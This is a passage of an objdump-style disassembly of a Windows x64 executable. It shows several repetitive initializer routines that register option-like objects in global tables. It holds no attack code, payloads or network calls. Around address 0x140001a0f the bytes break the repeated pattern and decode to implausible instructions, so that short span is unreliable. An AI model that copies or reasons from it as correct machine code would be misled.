   14000172d:	75 f2                	jne    0x140001721
   14000172f:	44 3b 05 d6 3b 08 00 	cmp    0x83bd6(%rip),%r8d        # 0x14008530c
   140001736:	72 2a                	jb     0x140001762
   140001738:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000173e:	45 33 c0             	xor    %r8d,%r8d
   140001741:	48 8d 15 c8 3b 08 00 	lea    0x83bc8(%rip),%rdx        # 0x140085310
   140001748:	48 8d 0d b1 3b 08 00 	lea    0x83bb1(%rip),%rcx        # 0x140085300
   14000174f:	e8 ac ee 01 00       	call   0x140020600
   140001754:	44 8b 05 ad 3b 08 00 	mov    0x83bad(%rip),%r8d        # 0x140085308
   14000175b:	48 8b 0d 9e 3b 08 00 	mov    0x83b9e(%rip),%rcx        # 0x140085300
   140001762:	41 8b c0             	mov    %r8d,%eax
   140001765:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001769:	ff 05 99 3b 08 00    	incl   0x83b99(%rip)        # 0x140085308
   14000176f:	4c 8b c7             	mov    %rdi,%r8
   140001772:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001777:	48 8d 0d 9a 3b 08 00 	lea    0x83b9a(%rip),%rcx        # 0x140085318
   14000177e:	e8 8d 34 02 00       	call   0x140024c10
   140001783:	48 8b 05 76 37 08 00 	mov    0x83776(%rip),%rax        # 0x140084f00
   14000178a:	90                   	nop
   14000178b:	48 85 c0             	test   %rax,%rax
   14000178e:	75 1a                	jne    0x1400017aa
   140001790:	4c 8d 05 59 2c 02 00 	lea    0x22c59(%rip),%r8        # 0x1400243f0
   140001797:	48 8d 15 82 2a 02 00 	lea    0x22a82(%rip),%rdx        # 0x140024220
   14000179e:	48 8d 0d 5b 37 08 00 	lea    0x8375b(%rip),%rcx        # 0x140084f00
   1400017a5:	e8 a6 39 03 00       	call   0x140035150
   1400017aa:	48 8b 0d 4f 37 08 00 	mov    0x8374f(%rip),%rcx        # 0x140084f00
   1400017b1:	45 33 c0             	xor    %r8d,%r8d
   1400017b4:	48 8d 15 05 3b 08 00 	lea    0x83b05(%rip),%rdx        # 0x1400852c0
   1400017bb:	e8 d0 28 02 00       	call   0x140024090
   1400017c0:	66 09 35 03 3b 08 00 	or     %si,0x83b03(%rip)        # 0x1400852ca
   1400017c7:	48 8d 0d e2 0c 06 00 	lea    0x60ce2(%rip),%rcx        # 0x1400624b0
   1400017ce:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400017d5:	00 
   1400017d6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400017da:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400017de:	49 8b e3             	mov    %r11,%rsp
   1400017e1:	5f                   	pop    %rdi
   1400017e2:	e9 3d a9 03 00       	jmp    0x14003c124
   1400017e7:	cc                   	int3
   1400017e8:	cc                   	int3
   1400017e9:	cc                   	int3
   1400017ea:	cc                   	int3
   1400017eb:	cc                   	int3
   1400017ec:	cc                   	int3
   1400017ed:	cc                   	int3
   1400017ee:	cc                   	int3
   1400017ef:	cc                   	int3
   1400017f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400017fa:	57                   	push   %rdi
   1400017fb:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001802:	48 8d 05 77 4a 06 00 	lea    0x64a77(%rip),%rax        # 0x140066280
   140001809:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000180e:	48 c7 44 24 38 3f 00 	movq   $0x3f,0x38(%rsp)
   140001815:	00 00 
   140001817:	48 8b 05 ca 36 08 00 	mov    0x836ca(%rip),%rax        # 0x140084ee8
   14000181e:	90                   	nop
   14000181f:	48 85 c0             	test   %rax,%rax
   140001822:	75 1a                	jne    0x14000183e
   140001824:	4c 8d 05 c5 2c 02 00 	lea    0x22cc5(%rip),%r8        # 0x1400244f0
   14000182b:	48 8d 15 1e 2b 02 00 	lea    0x22b1e(%rip),%rdx        # 0x140024350
   140001832:	48 8d 0d af 36 08 00 	lea    0x836af(%rip),%rcx        # 0x140084ee8
   140001839:	e8 12 39 03 00       	call   0x140035150
   14000183e:	48 8b 3d a3 36 08 00 	mov    0x836a3(%rip),%rdi        # 0x140084ee8
   140001845:	45 33 c0             	xor    %r8d,%r8d
   140001848:	33 d2                	xor    %edx,%edx
   14000184a:	48 8d 0d 2f 39 08 00 	lea    0x8392f(%rip),%rcx        # 0x140085180
   140001851:	e8 1a 12 02 00       	call   0x140022a70
   140001856:	90                   	nop
   140001857:	33 db                	xor    %ebx,%ebx
   140001859:	8b cb                	mov    %ebx,%ecx
   14000185b:	48 89 1d 9e 39 08 00 	mov    %rbx,0x8399e(%rip)        # 0x140085200
   140001862:	48 8d 05 af 49 06 00 	lea    0x649af(%rip),%rax        # 0x140066218
   140001869:	48 89 05 98 39 08 00 	mov    %rax,0x83998(%rip)        # 0x140085208
   140001870:	48 8d 05 b9 49 06 00 	lea    0x649b9(%rip),%rax        # 0x140066230
   140001877:	48 89 05 02 39 08 00 	mov    %rax,0x83902(%rip)        # 0x140085180
   14000187e:	48 8d 05 33 49 06 00 	lea    0x64933(%rip),%rax        # 0x1400661b8
   140001885:	48 89 05 84 39 08 00 	mov    %rax,0x83984(%rip)        # 0x140085210
   14000188c:	48 8d 05 2d 4a 06 00 	lea    0x64a2d(%rip),%rax        # 0x1400662c0
   140001893:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001898:	48 c7 44 24 28 09 00 	movq   $0x9,0x28(%rsp)
   14000189f:	00 00 
   1400018a1:	0f b7 05 e2 38 08 00 	movzwl 0x838e2(%rip),%eax        # 0x14008518a
   1400018a8:	be 00 40 00 00       	mov    $0x4000,%esi
   1400018ad:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400018b2:	66 85 c6             	test   %ax,%si
   1400018b5:	74 58                	je     0x14000190f
   1400018b7:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   1400018bd:	48 8b 05 3c 36 08 00 	mov    0x8363c(%rip),%rax        # 0x140084f00
   1400018c4:	90                   	nop
   1400018c5:	48 85 c0             	test   %rax,%rax
   1400018c8:	75 1a                	jne    0x1400018e4
   1400018ca:	4c 8d 05 1f 2b 02 00 	lea    0x22b1f(%rip),%r8        # 0x1400243f0
   1400018d1:	48 8d 15 48 29 02 00 	lea    0x22948(%rip),%rdx        # 0x140024220
   1400018d8:	48 8d 0d 21 36 08 00 	lea    0x83621(%rip),%rcx        # 0x140084f00
   1400018df:	e8 6c 38 03 00       	call   0x140035150
   1400018e4:	48 8b 0d 15 36 08 00 	mov    0x83615(%rip),%rcx        # 0x140084f00
   1400018eb:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400018f0:	48 8d 15 89 38 08 00 	lea    0x83889(%rip),%rdx        # 0x140085180
   1400018f7:	e8 34 5e 02 00       	call   0x140027730
   1400018fc:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001901:	48 8b 0d f8 38 08 00 	mov    0x838f8(%rip),%rcx        # 0x140085200
   140001908:	0f b7 05 7b 38 08 00 	movzwl 0x8387b(%rip),%eax        # 0x14008518a
   14000190f:	0f 29 05 7a 38 08 00 	movaps %xmm0,0x8387a(%rip)        # 0x140085190
   140001916:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   14000191b:	0f 29 05 7e 38 08 00 	movaps %xmm0,0x8387e(%rip)        # 0x1400851a0
   140001922:	48 85 c9             	test   %rcx,%rcx
   140001925:	74 47                	je     0x14000196e
   140001927:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   14000192e:	00 03 01 
   140001931:	48 8d 05 b0 47 06 00 	lea    0x647b0(%rip),%rax        # 0x1400660e8
   140001938:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000193d:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001942:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001947:	e8 14 43 03 00       	call   0x140035c60
   14000194c:	4c 8b c8             	mov    %rax,%r9
   14000194f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001954:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001959:	48 8d 0d 20 38 08 00 	lea    0x83820(%rip),%rcx        # 0x140085180
   140001960:	e8 bb 2e 02 00       	call   0x140024820
   140001965:	0f b7 05 1e 38 08 00 	movzwl 0x8381e(%rip),%eax        # 0x14008518a
   14000196c:	eb 0e                	jmp    0x14000197c
   14000196e:	48 8d 0d eb 17 08 00 	lea    0x817eb(%rip),%rcx        # 0x140083160
   140001975:	48 89 0d 84 38 08 00 	mov    %rcx,0x83884(%rip)        # 0x140085200
   14000197c:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001981:	66 23 c1             	and    %cx,%ax
   140001984:	66 83 c8 38          	or     $0x38,%ax
   140001988:	66 89 05 fb 37 08 00 	mov    %ax,0x837fb(%rip)        # 0x14008518a
   14000198f:	48 8d 05 ea 36 08 00 	lea    0x836ea(%rip),%rax        # 0x140085080
   140001996:	48 8b 0d 23 38 08 00 	mov    0x83823(%rip),%rcx        # 0x1400851c0
   14000199d:	48 8d 1d 84 35 08 00 	lea    0x83584(%rip),%rbx        # 0x140084f28
   1400019a4:	48 39 01             	cmp    %rax,(%rcx)
   1400019a7:	75 05                	jne    0x1400019ae
   1400019a9:	48 89 19             	mov    %rbx,(%rcx)
   1400019ac:	eb 61                	jmp    0x140001a0f
   1400019ae:	44 8b 05 13 38 08 00 	mov    0x83813(%rip),%r8d        # 0x1400851c8
   1400019b5:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   1400019b9:	48 8b c1             	mov    %rcx,%rax
   1400019bc:	48 3b ca             	cmp    %rdx,%rcx
   1400019bf:	74 0e                	je     0x1400019cf
   1400019c1:	48 39 18             	cmp    %rbx,(%rax)
   1400019c4:	74 49                	je     0x140001a0f
   1400019c6:	48 83 c0 08          	add    $0x8,%rax
   1400019ca:	48 3b c2             	cmp    %rdx,%rax
   1400019cd:	75 f2                	jne    0x1400019c1
   1400019cf:	44 3b 05 f6 37 08 00 	cmp    0x837f6(%rip),%r8d        # 0x1400851cc
   1400019d6:	72 2a                	jb     0x140001a02
   1400019d8:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400019de:	45 33 c0             	xor    %r8d,%r8d
   1400019e1:	48 8d 15 e8 37 08 00 	lea    0x837e8(%rip),%rdx        # 0x1400851d0
   1400019e8:	48 8d 0d d1 37 08 00 	lea    0x837d1(%rip),%rcx        # 0x1400851c0
   1400019ef:	e8 0c ec 01 00       	call   0x140020600
   1400019f4:	44 8b 05 cd 37 08 00 	mov    0x837cd(%rip),%r8d        # 0x1400851c8
   1400019fb:	48 8b 0d be 37 08 00 	mov    0x837be(%rip),%rcx        # 0x1400851c0
   140001a02:	41 8b c0             	mov    %r8d,%eax
   140001a05:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001a09:	ff 05 b9 37 08 00    	incl   0x837b9(%rip)        # 0x1400851c8
   140001a0f:	4c 8b 48 ff          	mov    -0x1(%rax),%r9
   140001a13:	c9                   	leave
   140001a14:	e9 46 1c 00 00       	jmp    0x14000365f
   140001a19:	0d ba 37 08 00       	or     $0x837ba,%eax
   140001a1e:	e8 ed 31 02 00       	call   0x140024c10
   140001a23:	48 8b 05 d6 34 08 00 	mov    0x834d6(%rip),%rax        # 0x140084f00
   140001a2a:	90                   	nop
   140001a2b:	48 85 c0             	test   %rax,%rax
   140001a2e:	75 1a                	jne    0x140001a4a
   140001a30:	4c 8d 05 b9 29 02 00 	lea    0x229b9(%rip),%r8        # 0x1400243f0
   140001a37:	48 8d 15 e2 27 02 00 	lea    0x227e2(%rip),%rdx        # 0x140024220
   140001a3e:	48 8d 0d bb 34 08 00 	lea    0x834bb(%rip),%rcx        # 0x140084f00
   140001a45:	e8 06 37 03 00       	call   0x140035150
   140001a4a:	48 8b 0d af 34 08 00 	mov    0x834af(%rip),%rcx        # 0x140084f00
   140001a51:	45 33 c0             	xor    %r8d,%r8d
   140001a54:	48 8d 15 25 37 08 00 	lea    0x83725(%rip),%rdx        # 0x140085180
   140001a5b:	e8 30 26 02 00       	call   0x140024090
   140001a60:	66 09 35 23 37 08 00 	or     %si,0x83723(%rip)        # 0x14008518a
   140001a67:	48 8d 0d 92 0a 06 00 	lea    0x60a92(%rip),%rcx        # 0x140062500
   140001a6e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001a75:	00 
   140001a76:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001a7a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001a7e:	49 8b e3             	mov    %r11,%rsp
   140001a81:	5f                   	pop    %rdi
   140001a82:	e9 9d a6 03 00       	jmp    0x14003c124
   140001a87:	cc                   	int3
   140001a88:	cc                   	int3
   140001a89:	cc                   	int3
   140001a8a:	cc                   	int3
   140001a8b:	cc                   	int3
   140001a8c:	cc                   	int3
   140001a8d:	cc                   	int3
   140001a8e:	cc                   	int3
   140001a8f:	cc                   	int3
   140001a90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001a9a:	57                   	push   %rdi
   140001a9b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001aa2:	48 8d 05 d7 48 06 00 	lea    0x648d7(%rip),%rax        # 0x140066380
   140001aa9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001aae:	48 c7 44 24 38 32 00 	movq   $0x32,0x38(%rsp)
   140001ab5:	00 00 
   140001ab7:	48 8b 05 2a 34 08 00 	mov    0x8342a(%rip),%rax        # 0x140084ee8
   140001abe:	90                   	nop
   140001abf:	48 85 c0             	test   %rax,%rax
   140001ac2:	75 1a                	jne    0x140001ade
   140001ac4:	4c 8d 05 25 2a 02 00 	lea    0x22a25(%rip),%r8        # 0x1400244f0
   140001acb:	48 8d 15 7e 28 02 00 	lea    0x2287e(%rip),%rdx        # 0x140024350
   140001ad2:	48 8d 0d 0f 34 08 00 	lea    0x8340f(%rip),%rcx        # 0x140084ee8
   140001ad9:	e8 72 36 03 00       	call   0x140035150
   140001ade:	48 8b 3d 03 34 08 00 	mov    0x83403(%rip),%rdi        # 0x140084ee8
   140001ae5:	45 33 c0             	xor    %r8d,%r8d
   140001ae8:	33 d2                	xor    %edx,%edx
   140001aea:	48 8d 0d af 35 08 00 	lea    0x835af(%rip),%rcx        # 0x1400850a0
   140001af1:	e8 7a 0f 02 00       	call   0x140022a70
   140001af6:	90                   	nop
   140001af7:	33 db                	xor    %ebx,%ebx
   140001af9:	8b cb                	mov    %ebx,%ecx
   140001afb:	48 89 1d 1e 36 08 00 	mov    %rbx,0x8361e(%rip)        # 0x140085120
   140001b02:	48 8d 05 0f 48 06 00 	lea    0x6480f(%rip),%rax        # 0x140066318
   140001b09:	48 89 05 18 36 08 00 	mov    %rax,0x83618(%rip)        # 0x140085128
   140001b10:	48 8d 05 19 48 06 00 	lea    0x64819(%rip),%rax        # 0x140066330
   140001b17:	48 89 05 82 35 08 00 	mov    %rax,0x83582(%rip)        # 0x1400850a0
   140001b1e:	48 8d 05 93 46 06 00 	lea    0x64693(%rip),%rax        # 0x1400661b8
   140001b25:	48 89 05 04 36 08 00 	mov    %rax,0x83604(%rip)        # 0x140085130
   140001b2c:	48 8d 05 81 48 06 00 	lea    0x64881(%rip),%rax        # 0x1400663b4
   140001b33:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b38:	48 c7 44 24 28 04 00 	movq   $0x4,0x28(%rsp)
   140001b3f:	00 00 
   140001b41:	0f b7 05 62 35 08 00 	movzwl 0x83562(%rip),%eax        # 0x1400850aa
   140001b48:	be 00 40 00 00       	mov    $0x4000,%esi
   140001b4d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001b52:	66 85 c6             	test   %ax,%si
   140001b55:	74 58                	je     0x140001baf
   140001b57:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140001b5d:	48 8b 05 9c 33 08 00 	mov    0x8339c(%rip),%rax        # 0x140084f00
   140001b64:	90                   	nop
   140001b65:	48 85 c0             	test   %rax,%rax
   140001b68:	75 1a                	jne    0x140001b84
   140001b6a:	4c 8d 05 7f 28 02 00 	lea    0x2287f(%rip),%r8        # 0x1400243f0
   140001b71:	48 8d 15 a8 26 02 00 	lea    0x226a8(%rip),%rdx        # 0x140024220
   140001b78:	48 8d 0d 81 33 08 00 	lea    0x83381(%rip),%rcx        # 0x140084f00
   140001b7f:	e8 cc 35 03 00       	call   0x140035150
   140001b84:	48 8b 0d 75 33 08 00 	mov    0x83375(%rip),%rcx        # 0x140084f00
   140001b8b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001b90:	48 8d 15 09 35 08 00 	lea    0x83509(%rip),%rdx        # 0x1400850a0
   140001b97:	e8 94 5b 02 00       	call   0x140027730
   140001b9c:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001ba1:	48 8b 0d 78 35 08 00 	mov    0x83578(%rip),%rcx        # 0x140085120
   140001ba8:	0f b7 05 fb 34 08 00 	movzwl 0x834fb(%rip),%eax        # 0x1400850aa
   140001baf:	0f 29 05 fa 34 08 00 	movaps %xmm0,0x834fa(%rip)        # 0x1400850b0
   140001bb6:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140001bbb:	0f 29 05 fe 34 08 00 	movaps %xmm0,0x834fe(%rip)        # 0x1400850c0
   140001bc2:	48 85 c9             	test   %rcx,%rcx
   140001bc5:	74 47                	je     0x140001c0e
   140001bc7:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   140001bce:	00 03 01 
   140001bd1:	48 8d 05 10 45 06 00 	lea    0x64510(%rip),%rax        # 0x1400660e8
   140001bd8:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140001bdd:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001be2:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001be7:	e8 74 40 03 00       	call   0x140035c60
   140001bec:	4c 8b c8             	mov    %rax,%r9
   140001bef:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001bf4:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001bf9:	48 8d 0d a0 34 08 00 	lea    0x834a0(%rip),%rcx        # 0x1400850a0
   140001c00:	e8 1b 2c 02 00       	call   0x140024820
   140001c05:	0f b7 05 9e 34 08 00 	movzwl 0x8349e(%rip),%eax        # 0x1400850aa
   140001c0c:	eb 0e                	jmp    0x140001c1c
   140001c0e:	48 8d 0d 8b 15 08 00 	lea    0x8158b(%rip),%rcx        # 0x1400831a0
   140001c15:	48 89 0d 04 35 08 00 	mov    %rcx,0x83504(%rip)        # 0x140085120
   140001c1c:	66 83 c8 18          	or     $0x18,%ax
   140001c20:	66 89 05 83 34 08 00 	mov    %ax,0x83483(%rip)        # 0x1400850aa
   140001c27:	48 8d 05 52 34 08 00 	lea    0x83452(%rip),%rax        # 0x140085080
   140001c2e:	48 8b 0d ab 34 08 00 	mov    0x834ab(%rip),%rcx        # 0x1400850e0
   140001c35:	48 8d 1d ec 32 08 00 	lea    0x832ec(%rip),%rbx        # 0x140084f28
   140001c3c:	48 39 01             	cmp    %rax,(%rcx)
   140001c3f:	75 05                	jne    0x140001c46
   140001c41:	48 89 19             	mov    %rbx,(%rcx)
   140001c44:	eb 68                	jmp    0x140001cae
   140001c46:	44 8b 05 9b 34 08 00 	mov    0x8349b(%rip),%r8d        # 0x1400850e8
   140001c4d:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001c51:	48 8b c1             	mov    %rcx,%rax
   140001c54:	48 3b ca             	cmp    %rdx,%rcx
   140001c57:	74 15                	je     0x140001c6e
   140001c59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001c60:	48 39 18             	cmp    %rbx,(%rax)
   140001c63:	74 49                	je     0x140001cae
   140001c65:	48 83 c0 08          	add    $0x8,%rax
   140001c69:	48 3b c2             	cmp    %rdx,%rax
   140001c6c:	75 f2                	jne    0x140001c60
   140001c6e:	44 3b 05 77 34 08 00 	cmp    0x83477(%rip),%r8d        # 0x1400850ec
   140001c75:	72 2a                	jb     0x140001ca1
   140001c77:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140001c7d:	45 33 c0             	xor    %r8d,%r8d
   140001c80:	48 8d 15 69 34 08 00 	lea    0x83469(%rip),%rdx        # 0x1400850f0
   140001c87:	48 8d 0d 52 34 08 00 	lea    0x83452(%rip),%rcx        # 0x1400850e0
   140001c8e:	e8 6d e9 01 00       	call   0x140020600
   140001c93:	44 8b 05 4e 34 08 00 	mov    0x8344e(%rip),%r8d        # 0x1400850e8
   140001c9a:	48 8b 0d 3f 34 08 00 	mov    0x8343f(%rip),%rcx        # 0x1400850e0
   140001ca1:	41 8b c0             	mov    %r8d,%eax
   140001ca4:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001ca8:	ff 05 3a 34 08 00    	incl   0x8343a(%rip)        # 0x1400850e8
   140001cae:	4c 8b c7             	mov    %rdi,%r8
   140001cb1:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001cb6:	48 8d 0d 3b 34 08 00 	lea    0x8343b(%rip),%rcx        # 0x1400850f8
   140001cbd:	e8 4e 2f 02 00       	call   0x140024c10
   140001cc2:	48 8b 05 37 32 08 00 	mov    0x83237(%rip),%rax        # 0x140084f00
   140001cc9:	90                   	nop
   140001cca:	48 85 c0             	test   %rax,%rax
   140001ccd:	75 1a                	jne    0x140001ce9
   140001ccf:	4c 8d 05 1a 27 02 00 	lea    0x2271a(%rip),%r8        # 0x1400243f0
   140001cd6:	48 8d 15 43 25 02 00 	lea    0x22543(%rip),%rdx        # 0x140024220
   140001cdd:	48 8d 0d 1c 32 08 00 	lea    0x8321c(%rip),%rcx        # 0x140084f00
   140001ce4:	e8 67 34 03 00       	call   0x140035150
   140001ce9:	48 8b 0d 10 32 08 00 	mov    0x83210(%rip),%rcx        # 0x140084f00
   140001cf0:	45 33 c0             	xor    %r8d,%r8d
   140001cf3:	48 8d 15 a6 33 08 00 	lea    0x833a6(%rip),%rdx        # 0x1400850a0
   140001cfa:	e8 91 23 02 00       	call   0x140024090
   140001cff:	66 09 35 a4 33 08 00 	or     %si,0x833a4(%rip)        # 0x1400850aa
   140001d06:	48 8d 0d 43 08 06 00 	lea    0x60843(%rip),%rcx        # 0x140062550
   140001d0d:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001d14:	00 
   140001d15:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001d19:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001d1d:	49 8b e3             	mov    %r11,%rsp
   140001d20:	5f                   	pop    %rdi
   140001d21:	e9 fe a3 03 00       	jmp    0x14003c124
   140001d26:	cc                   	int3
   140001d27:	cc                   	int3
   140001d28:	cc                   	int3
   140001d29:	cc                   	int3
   140001d2a:	cc                   	int3
   140001d2b:	cc                   	int3
   140001d2c:	cc                   	int3
   140001d2d:	cc                   	int3
   140001d2e:	cc                   	int3
   140001d2f:	cc                   	int3
   140001d30:	48 83 ec 68          	sub    $0x68,%rsp
   140001d34:	48 8d 05 85 46 06 00 	lea    0x64685(%rip),%rax        # 0x1400663c0
   140001d3b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d40:	48 c7 44 24 48 10 00 	movq   $0x10,0x48(%rsp)
   140001d47:	00 00 
   140001d49:	33 d2                	xor    %edx,%edx
   140001d4b:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140001d4f:	48 8d 0d fa 31 08 00 	lea    0x831fa(%rip),%rcx        # 0x140084f50
   140001d56:	e8 15 0d 02 00       	call   0x140022a70
   140001d5b:	90                   	nop
   140001d5c:	48 8d 05 55 48 06 00 	lea    0x64855(%rip),%rax        # 0x1400665b8
   140001d63:	48 89 05 e6 31 08 00 	mov    %rax,0x831e6(%rip)        # 0x140084f50
   140001d6a:	33 c9                	xor    %ecx,%ecx
   140001d6c:	48 89 0d 5d 32 08 00 	mov    %rcx,0x8325d(%rip)        # 0x140084fd0
   140001d73:	48 8d 05 5a 46 06 00 	lea    0x6465a(%rip),%rax        # 0x1400663d4
   140001d7a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001d7f:	48 c7 44 24 28 01 00 	movq   $0x1,0x28(%rsp)
   140001d86:	00 00 
   140001d88:	0f b7 05 cb 31 08 00 	movzwl 0x831cb(%rip),%eax        # 0x140084f5a
   140001d8f:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001d94:	66 0f ba e0 0e       	bt     $0xe,%ax
   140001d99:	73 58                	jae    0x140001df3
   140001d9b:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140001da1:	48 8b 05 58 31 08 00 	mov    0x83158(%rip),%rax        # 0x140084f00
   140001da8:	90                   	nop
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	75 1a                	jne    0x140001dc8
   140001dae:	4c 8d 05 3b 26 02 00 	lea    0x2263b(%rip),%r8        # 0x1400243f0
   140001db5:	48 8d 15 64 24 02 00 	lea    0x22464(%rip),%rdx        # 0x140024220
   140001dbc:	48 8d 0d 3d 31 08 00 	lea    0x8313d(%rip),%rcx        # 0x140084f00
   140001dc3:	e8 88 33 03 00       	call   0x140035150
   140001dc8:	48 8b 0d 31 31 08 00 	mov    0x83131(%rip),%rcx        # 0x140084f00
   140001dcf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001dd4:	48 8d 15 75 31 08 00 	lea    0x83175(%rip),%rdx        # 0x140084f50
   140001ddb:	e8 50 59 02 00       	call   0x140027730
   140001de0:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001de5:	48 8b 0d e4 31 08 00 	mov    0x831e4(%rip),%rcx        # 0x140084fd0
   140001dec:	0f b7 05 67 31 08 00 	movzwl 0x83167(%rip),%eax        # 0x140084f5a
   140001df3:	0f 29 05 66 31 08 00 	movaps %xmm0,0x83166(%rip)        # 0x140084f60
   140001dfa:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001dff:	66 0b c2             	or     %dx,%ax
   140001e02:	66 89 05 51 31 08 00 	mov    %ax,0x83151(%rip)        # 0x140084f5a
   140001e09:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140001e0e:	0f 29 05 5b 31 08 00 	movaps %xmm0,0x8315b(%rip)        # 0x140084f70
   140001e15:	48 85 c9             	test   %rcx,%rcx
   140001e18:	74 4a                	je     0x140001e64
   140001e1a:	66 c7 44 24 30 03 01 	movw   $0x103,0x30(%rsp)
   140001e21:	48 8d 05 98 48 06 00 	lea    0x64898(%rip),%rax        # 0x1400666c0
   140001e28:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001e2d:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140001e34:	00 00 
   140001e36:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001e3d:	00 00 
   140001e3f:	e8 1c 3e 03 00       	call   0x140035c60
   140001e44:	4c 8b c8             	mov    %rax,%r9
   140001e47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001e4c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001e51:	48 8d 0d f8 30 08 00 	lea    0x830f8(%rip),%rcx        # 0x140084f50
   140001e58:	e8 c3 29 02 00       	call   0x140024820
   140001e5d:	0f b7 05 f6 30 08 00 	movzwl 0x830f6(%rip),%eax        # 0x140084f5a
   140001e64:	48 8d 15 35 32 08 00 	lea    0x83235(%rip),%rdx        # 0x1400850a0
   140001e6b:	48 89 15 5e 31 08 00 	mov    %rdx,0x8315e(%rip)        # 0x140084fd0
   140001e72:	ba 00 20 00 00       	mov    $0x2000,%edx
   140001e77:	66 0b c2             	or     %dx,%ax
   140001e7a:	66 89 05 d9 30 08 00 	mov    %ax,0x830d9(%rip)        # 0x140084f5a
   140001e81:	48 8d 0d c8 30 08 00 	lea    0x830c8(%rip),%rcx        # 0x140084f50
   140001e88:	e8 63 27 02 00       	call   0x1400245f0
   140001e8d:	90                   	nop
   140001e8e:	48 8d 0d 0b 07 06 00 	lea    0x6070b(%rip),%rcx        # 0x1400625a0
   140001e95:	48 83 c4 68          	add    $0x68,%rsp
   140001e99:	e9 86 a2 03 00       	jmp    0x14003c124
   140001e9e:	cc                   	int3
   140001e9f:	cc                   	int3
   140001ea0:	48 8b 0d b1 12 08 00 	mov    0x812b1(%rip),%rcx        # 0x140083158
   140001ea7:	48 03 0d 7a 12 08 00 	add    0x8127a(%rip),%rcx        # 0x140083128
   140001eae:	48 89 0d 93 30 08 00 	mov    %rcx,0x83093(%rip)        # 0x140084f48
   140001eb5:	c3                   	ret
   140001eb6:	cc                   	int3
   140001eb7:	cc                   	int3
   140001eb8:	cc                   	int3
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	48 8d 0d 19 07 06 00 	lea    0x60719(%rip),%rcx        # 0x1400625e0
   140001ec7:	e9 58 a2 03 00       	jmp    0x14003c124
   140001ecc:	cc                   	int3
   140001ecd:	cc                   	int3
   140001ece:	cc                   	int3
   140001ecf:	cc                   	int3
   140001ed0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
